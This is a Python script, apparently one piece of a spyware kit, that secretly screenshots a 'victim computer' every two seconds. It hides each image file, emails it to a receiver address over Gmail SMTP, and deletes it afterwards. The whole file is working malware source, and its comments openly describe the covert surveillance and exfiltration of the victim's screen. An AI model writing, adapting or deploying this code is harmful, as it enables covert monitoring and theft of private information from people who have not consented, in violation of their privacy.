from pyscreenshot import *
from time import sleep
import subprocess
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
#same mail sender function used in the webcam_capture script
def SendMail(ImgFileName):
    img_data = open(ImgFileName, 'rb').read()
    msg = MIMEMultipart()
    msg['Subject'] = 'subject'
    msg['From'] = 'sender_mail'
    msg['To'] = 'receiver_mail'

    text = MIMEText("test")
    msg.attach(text)
    image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
    msg.attach(image)

    server=smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.login("sender_mail", "sender_pass")
    server.sendmail("sender_mail", "receiver_mail", msg.as_string())
    server.quit()
#we used an infinite loop to keep sending screenshots from the victim computer 
while True:
    #a screen shot is grapped and setted in hidden mode
    image = grab() 
    image.save("save.png")
    subprocess.check_call(["attrib","+H",'save.png'])
    try:
        SendMail('save.png')
    #when sending the image by email the system might give a permission error so we used chmod for the os module to change the permission and get a full access on the image
    #to be sended
    except PermissionError:
        os.chmod('save.png', 777)
        SendMail('save.png')
    except Exception:
        pass
    #after sending the screenshot the image is removed
    os.remove('save.png')
    #the sleep show the time between every screenshot the "seconds" will be modified from the generator scrpit by the user to an actual number
    sleep(2)